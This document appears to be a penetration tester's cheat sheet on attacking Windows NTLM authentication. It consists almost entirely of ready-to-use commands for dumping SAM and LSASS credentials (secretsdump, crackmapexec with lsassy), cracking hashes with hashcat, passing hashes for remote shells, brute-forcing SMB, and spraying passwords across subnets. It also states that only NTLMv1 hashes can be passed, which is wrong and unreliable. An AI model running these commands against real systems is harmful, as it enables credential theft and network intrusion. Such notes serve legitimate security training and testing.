# NTLM Hashes

## Dumping SAM Hashes with secretsdump.py

https://github.com/SecureAuthCorp/impacket

```
secretsdump.py DOMAIN/USERNAME:PASSWORD@IP

with a valid hash

secretsdump.py administrator@192.168.1.2 -hashes adwad2241...:7df4fbesf...
```

Ignore Guest, DefaultAccount and WDAGUtilityAccount

## Cracking NTLM Hashes with Hashcat

On Windows

```
hashcat64.exe -m 1000 hashfile.txt rockyou.txt -O
```

## Pass the hash

You can only pass NTLM V1 hashes

```
pth-winexe -U Administrator%LMHASH:NTLMHASH //IP cmd

crackmapexec smb IP -u "USERNAME" -H HASH --local-auth
```

## CrackMapExec

Brute Force

```
crackmapexec smb 10.10.10.184 -u USER_LIST -p pass.txt
```

List shares

```
crackmapexec smb 10.10.10.184 -u USER -p PASSWORD --shares
```
### Sweep a subnet using a Pass attack

```
crackmapexec smb 192.168.138.0/24 -u fcastle -d MARVEL.local -p Password

Using a hash instead

crackmapexec smb 192.168.138.0/24 -u administrator -H aadwaudfbwaufg382:7faceafawf --local-auth

In order to dump SAM hashes

crackmapexec smb 192.168.138.0/24 -u administrator -H aadwaudfbwaufg382:7faceafawf --local-auth --sam

Run lsassy to dumpsecrets stored in memory

crackmapexec smb 192.168.138.0/24 -u administrator -H aadwaudfbwaufg382:7faceafawf --local-auth -M lsassy
```

Null authentication

```
crackmapexec smb 10.10.10.184 --pass-pol -u '' -p ''
```

Test credentials on local network (password spraying)

```
crackmapexec 192.168.57.0/24 -u USERNAME -d DOMAIN.local -p PASSWORD
```
